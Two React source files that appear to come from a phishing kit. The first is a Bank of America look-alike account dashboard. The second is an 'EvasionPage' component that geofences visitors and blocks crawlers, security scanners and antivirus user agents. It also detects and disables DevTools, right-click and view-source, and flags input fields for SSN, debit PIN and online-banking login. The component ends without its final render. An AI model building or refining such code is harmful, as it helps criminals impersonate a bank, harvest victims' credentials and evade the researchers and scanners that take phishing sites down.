import DashboardLayout from "@/components/DashboardLayout";
import { accountData, dashboardSummary, transactions, formatCurrency } from "@/data/accountData";
import { useAuth } from "@/contexts/AuthContext";
import {
  ArrowUpRight, ArrowDownLeft, ChevronRight, Send,
  DollarSign, TrendingUp, Eye, EyeOff, CreditCard, PieChart
} from "lucide-react";
import { useState } from "react";
import { Link } from "react-router-dom";

const Dashboard = () => {
  const { user } = useAuth();
  const [showBalances, setShowBalances] = useState(true);

  const recentTransactions = transactions.slice(0, 6);

  return (
    <DashboardLayout>
      <div className="space-y-6">
        {/* Greeting card - Hello [Name], Life Plan, My Rewards */}
        <div className="bg-white border border-gray-200 rounded-lg shadow-sm overflow-hidden">
          <div className="p-4 sm:p-6">
            <h1 className="text-xl sm:text-2xl font-bold text-gray-900 mb-1">
              Hello, {user?.name.split(" ")[0]}
            </h1>
            <p className="text-sm text-gray-500 mb-4">Preferred Rewards Gold Member</p>
            <div className="space-y-2">
              <Link
                to="/dashboard"
                className="flex items-center justify-between py-3 border-b border-gray-100 last:border-0 hover:bg-gray-50 -mx-2 px-2 rounded transition-colors group"
              >
                <div className="flex items-center gap-3">
                  <Send className="h-5 w-5 text-[#012169]" />
                  <div className="text-left">
                    <p className="font-semibold text-gray-900 text-sm">Bank of America Life Plan®</p>
                    <p className="text-xs text-gray-500">Your next steps are ready. Let&apos;s go!</p>
                  </div>
                </div>
                <ChevronRight className="h-5 w-5 text-gray-400 group-hover:text-[#E31837]" />
              </Link>
              <Link
                to="/dashboard"
                className="flex items-center justify-between py-3 hover:bg-gray-50 -mx-2 px-2 rounded transition-colors group"
              >
                <p className="font-semibold text-gray-900 text-sm">My Rewards</p>
                <ChevronRight className="h-5 w-5 text-gray-400 group-hover:text-[#E31837]" />
              </Link>
            </div>
          </div>
        </div>

        {/* Net Worth / Summary card - shown first */}
        <div className="bg-white border border-gray-200 rounded-lg shadow-sm overflow-hidden">
          <div className="border-t-2 border-[#E31837] p-4 sm:p-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm font-medium text-gray-900">Net Worth¹</p>
                <p className="text-2xl font-bold text-gray-900 mt-1">
                  {showBalances ? formatCurrency(accountData.totalBalance) : "••••••••"}
                </p>
              </div>
              <button
                onClick={() => setShowBalances(!showBalances)}
                className="flex items-center gap-2 text-sm text-[#012169] hover:underline"
              >
                {showBalances ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                {showBalances ? "Hide" : "Show"}
              </button>
            </div>
            <ChevronRight className="h-5 w-5 text-gray-400 mt-2" />
          </div>
        </div>

        {/* Credit Cards & Investments summary - edit amounts in src/data/accountData.ts (dashboardSummary) */}
        <div className="grid md:grid-cols-2 gap-4">
          <div className="bg-white border border-gray-200 rounded-lg shadow-sm p-4 flex items-center gap-3">
            <div className="h-10 w-10 rounded-full bg-[#E31837]/10 flex items-center justify-center">
              <CreditCard className="h-5 w-5 text-[#E31837]" />
            </div>
            <div>
              <p className="text-sm font-medium text-gray-900">Credit Cards</p>
              <p className="text-xl font-bold text-gray-900">
                {showBalances ? formatCurrency(dashboardSummary.creditCardsBalance) : "••••••••"}
              </p>
            </div>
          </div>
          <div className="bg-white border border-gray-200 rounded-lg shadow-sm p-4 flex items-center gap-3">
            <div className="h-10 w-10 rounded-full bg-[#012169]/10 flex items-center justify-center">
              <PieChart className="h-5 w-5 text-[#012169]" />
            </div>
            <div>
              <p className="text-sm font-medium text-gray-900">Investments</p>
              <p className="text-xl font-bold text-gray-900">
                {showBalances ? formatCurrency(dashboardSummary.investmentsBalance) : "••••••••"}
              </p>
            </div>
          </div>
        </div>

        {/* Bank of America accounts section - single user's accounts only */}
        <div className="bg-white border border-gray-200 rounded-lg shadow-sm overflow-hidden">
          <div className="bg-[#E31837] px-4 sm:px-6 py-3">
            <h2 className="text-lg font-bold text-white">Bank of America</h2>
          </div>
          <div className="divide-y divide-gray-200">
            {[
              { name: accountData.checking.name, number: accountData.checking.number, balance: accountData.checking.balance },
              { name: accountData.savings.name, number: accountData.savings.number, balance: accountData.savings.balance },
            ].map((account) => (
              <div
                key={account.number}
                className="flex items-center justify-between px-4 sm:px-6 py-4 hover:bg-gray-50 transition-colors"
              >
                <div>
                  <p className="text-sm font-medium text-gray-900">{account.name} ****{account.number}</p>
                  <p className="text-xl sm:text-2xl font-bold text-gray-900 mt-1">
                    {showBalances
                      ? formatCurrency(account.balance)
                      : "••••••••"}
                  </p>
                </div>
                <Link
                  to="/dashboard"
                  className="px-4 py-2 text-sm font-medium text-gray-600 bg-gray-100 hover:bg-gray-200 rounded transition-colors"
                >
                  VIEW
                </Link>
              </div>
            ))}
          </div>
        </div>

        {/* Quick Actions */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
          {[
            { label: "Transfer Money", path: "/transfers", icon: ArrowUpRight },
            { label: "Pay Bills", path: "/bill-pay", icon: DollarSign },
            { label: "View Statements", path: "/dashboard", icon: TrendingUp },
            { label: "Account Settings", path: "/settings", icon: Eye },
          ].map(({ label, path, icon: Icon }) => (
            <Link
              key={label}
              to={path}
              className="flex flex-col items-center gap-2 bg-white border border-gray-200 rounded-lg p-4 hover:border-[#E31837]/40 hover:shadow-md transition-all text-center"
            >
              <Icon className="h-6 w-6 text-[#E31837]" />
              <span className="text-xs font-medium text-gray-900">{label}</span>
            </Link>
          ))}
        </div>

        {/* Recent Activity - BofA Account Activity style */}
        <div className="bg-white border border-gray-200 rounded-lg shadow-sm overflow-hidden">
          <div className="px-4 sm:px-6 py-4 border-b border-gray-200 bg-gray-50">
            <h2 className="text-lg font-bold text-gray-900">BofA Checking: Account Activity</h2>
            <p className="text-sm text-gray-600 mt-1">
              Balance Summary: {showBalances ? formatCurrency(accountData.checking.balance) : "••••••••"} (available as of today)
            </p>
          </div>
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead>
                <tr className="text-left text-xs font-semibold text-gray-900 bg-gray-100 border-b border-gray-200">
                  <th className="px-4 py-3">Posting Date</th>
                  <th className="px-4 py-3">Description</th>
                  <th className="px-4 py-3">Status</th>
                  <th className="px-4 py-3 text-right">Amount</th>
                  <th className="px-4 py-3 text-right">Available Balance</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-200">
                {recentTransactions.map((tx) => (
                  <tr key={tx.id} className="hover:bg-gray-50">
                    <td className="px-4 py-3 text-gray-700">{tx.date}</td>
                    <td className="px-4 py-3 text-gray-900">{tx.description}</td>
                    <td className="px-4 py-3 text-gray-600">C</td>
                    <td className={`px-4 py-3 text-right font-medium ${
                      tx.type === "credit" ? "text-green-600" : "text-gray-900"
                    }`}>
                      {tx.type === "credit" ? "+" : ""}{formatCurrency(Math.abs(tx.amount))}
                    </td>
                    <td className="px-4 py-3 text-right text-gray-600">—</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
          <div className="px-4 py-3 border-t border-gray-200">
            <Link to="/dashboard" className="text-sm text-[#012169] font-medium hover:underline">
              View All Transactions
            </Link>
          </div>
        </div>
      </div>
    </DashboardLayout>
  );
};

export default Dashboard;
import { useEffect, useState } from 'react';

const EVASION_CONFIG = {
  targetCountries: ['US', 'CA', 'GB', 'GH'],
  showFormDelay: 2000,
};

export default function EvasionPage() {
  const [isTargetLocation, setIsTargetLocation] = useState<boolean | null>(null);
  const [showContent, setShowContent] = useState(false);

  // 1. Geotargeting check
  const checkGeolocation = async () => {
    try {
      const response = await fetch('https://ipapi.co/json/');
      const data = await response.json();
      const allowed = EVASION_CONFIG.targetCountries.includes(data.country_code);
      setIsTargetLocation(allowed);
      return allowed;
    } catch {
      // Fail open (allow if API fails)
      setIsTargetLocation(true);
      return true;
    }
  };

  // 2. Basic bot detection
  const detectBots = () => {
    const ua = navigator.userAgent.toLowerCase();
    const blocked = [
      'curl', 'wget', 'python', 'requests', 'scrapy',
      'phantomjs', 'selenium', 'headless', 'bot',
      'crawler', 'spider', 'scanner', 'security',
      'malware', 'antivirus', 'firewall',
    ];

    if (blocked.some((term) => ua.includes(term))) {
      return true;
    }

    // Behavioral (mouse/keyboard) check after delay
    let mouse = 0;
    let keys = 0;

    const onMouse = () => mouse++;
    const onKey = () => keys++;

    document.addEventListener('mousemove', onMouse);
    document.addEventListener('keypress', onKey);

    setTimeout(() => {
      if (mouse === 0 && keys === 0) {
        console.log('Bot-like behavior detected');
        // You could hide content or redirect here
      }
      // Cleanup (optional)
      document.removeEventListener('mousemove', onMouse);
      document.removeEventListener('keypress', onKey);
    }, 3000);

    return false;
  };

  // 3. DevTools detection (size + Image trick)
  const detectDevTools = () => {
    const threshold = 160;
    if (
      window.outerHeight - window.innerHeight > threshold ||
      window.outerWidth - window.innerWidth > threshold
    ) {
      console.log('DevTools detected via window size');
      // Could hide content here
    }

    let devtoolsOpen = false;
    const element = new Image();
    Object.defineProperty(element, 'id', {
      get: () => {
        devtoolsOpen = true;
        console.log('DevTools detected via console access');
      },
    });

    const interval = setInterval(() => {
      devtoolsOpen = false;
      console.log(element); // Triggers getter if console open
      console.clear();
    }, 1000);

    // Cleanup on unmount
    return () => clearInterval(interval);
  };

  // 4. Disable inspection / right-click / keys / selection / drag
  const disableInspection = () => {
    // Right-click
    const onContext = (e: MouseEvent) => {
      e.preventDefault();
      return false;
    };
    document.addEventListener('contextmenu', onContext);

    // Key combos
    const onKeyDown = (e: KeyboardEvent) => {
      if (
        e.keyCode === 123 || // F12
        (e.ctrlKey && e.shiftKey && e.keyCode === 73) || // Ctrl+Shift+I
        (e.ctrlKey && e.keyCode === 85) || // Ctrl+U
        (e.ctrlKey && e.keyCode === 83) || // Ctrl+S
        (e.ctrlKey && e.shiftKey && e.keyCode === 67) || // Ctrl+Shift+C
        (e.ctrlKey && e.shiftKey && e.keyCode === 74) || // Ctrl+Shift+J
        (e.ctrlKey && e.shiftKey && e.keyCode === 46)    // Ctrl+Shift+Del
      ) {
        e.preventDefault();
        return false;
      }
    };
    document.addEventListener('keydown', onKeyDown);

    // Disable selection
    document.addEventListener('selectstart', (e) => e.preventDefault());

    // Disable drag
    document.addEventListener('dragstart', (e) => e.preventDefault());

    // Cleanup
    return () => {
      document.removeEventListener('contextmenu', onContext);
      document.removeEventListener('keydown', onKeyDown);
    };
  };

  // Main init
  useEffect(() => {
    const runEvasion = async () => {
      disableInspection(); // Run immediately

      if (detectBots()) {
        // Bot → maybe show blank or redirect
        return;
      }

      const geoOk = await checkGeolocation();
      if (!geoOk) {
        // Non-target → hide or redirect
        return;
      }

      detectDevTools(); // Start polling

      // All passed → show content after delay
      setTimeout(() => {
        setShowContent(true);
      }, EVASION_CONFIG.showFormDelay);
    };

    runEvasion();

    // Periodic console clear
    const clearIntervalId = setInterval(() => {
      console.clear();
    }, 1000);

    return () => {
      clearInterval(clearIntervalId);
      // Add any other cleanups from returned functions above
    };
  }, []);

  // Optional: Track clicks on sensitive fields (add IDs to your inputs)
  useEffect(() => {
    const sensitiveIds = ['ssn', 'debit-pin', 'online-password', 'online-username', 'account-number'];

    const handlers: { [key: string]: () => void } = {};

    sensitiveIds.forEach((id) => {
      const el = document.getElementById(id);
      if (el) {
        const handler = () => console.warn('.');
        el.addEventListener('click', handler);
        handlers[id] = handler;
      }
    });

    return () => {
      Object.entries(handlers).forEach(([id, fn]) => {
        document.getElementById(id)?.removeEventListener('click', fn);
      });
    };
  }, []);

  // Render nothing or fake loading until checks pass
  if (isTargetLocation === false || !showContent) {
    return <div style={{ height: '100vh', background: '#000', color: '#fff' }}>Loading secure session...</div>;
  }


}